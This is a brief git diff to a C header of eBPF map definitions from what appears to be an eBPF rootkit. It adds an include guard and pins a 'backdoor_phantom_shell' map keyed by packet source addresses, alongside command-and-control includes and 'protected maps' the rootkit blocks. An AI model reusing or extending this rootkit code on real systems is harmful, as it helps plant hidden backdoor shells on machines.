@@ -1,7 +1,9 @@
 #ifndef __BPF_MAP_DEFS_H
 #define __BPF_MAP_DEFS_H
 
+#ifndef __H_TCKIT
 #include "headervmlinux.h"
+#endif
 #include "../../../common/c&c.h"
 
 //Tasks and comms
@@ -87,8 +89,8 @@ struct backdoor_priv_phantom_shell{
 	__uint(max_entries, 1);
 	__type(key, __u64); //Source IPv4 of packet
 	__type(value, struct backdoor_phantom_shell_data);
+	__uint(pinning, LIBBPF_PIN_BY_NAME);
 } backdoor_phantom_shell SEC(".maps");
-
 
 /*PROTECTED MAPS*/
 //Any attempt to access these maps will be blocked by the rootkit if the program is not whitelisted
